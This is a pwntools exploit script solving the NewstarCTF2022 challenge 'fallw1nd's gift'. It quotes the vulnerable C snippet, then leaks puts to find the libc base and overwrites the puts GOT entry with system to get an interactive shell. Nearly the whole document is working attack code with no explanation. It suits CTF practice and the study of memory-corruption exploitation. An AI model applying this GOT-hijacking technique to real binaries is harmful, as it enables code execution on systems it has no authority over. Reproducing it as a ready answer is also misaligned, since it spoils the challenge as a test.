"""NewstarCTF2022 fallw1nd’s gift
GOT Hijacking

  printf("%p", &puts);
  puts("\nnow input your addr:");
  __isoc99_scanf("%p", buf);
  puts("now input your content:");
  read(0, buf[0], 0x10uLL);
  puts("/bin/sh");
"""
from pwn import *

binary = './fallw1nd_gift'

warnings.filterwarnings("ignore", category=BytesWarning)
context(log_level='info', arch='amd64', os='linux', binary=binary)

s = process()
# gdb.attach(s, 'b*0x0004012C4\nc')
s.recvuntil(b'reward:\n')
puts_addr = s.recvline().decode()
puts_addr = int(puts_addr, 16)
print(hex(puts_addr))

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
libc.address = puts_addr - libc.sym['puts']
success('libc:' + hex(libc.address))

elf = ELF(binary, checksec=False)
puts_got = elf.got['puts']
success('puts: ' + hex(puts_got))
s.sendlineafter('addr:', f"{puts_got:x}")  # puts: 0x4033f8, scanf参数为%p 直接输入 4033f8
s.send(flat(libc.sym['system']))

s.interactive()
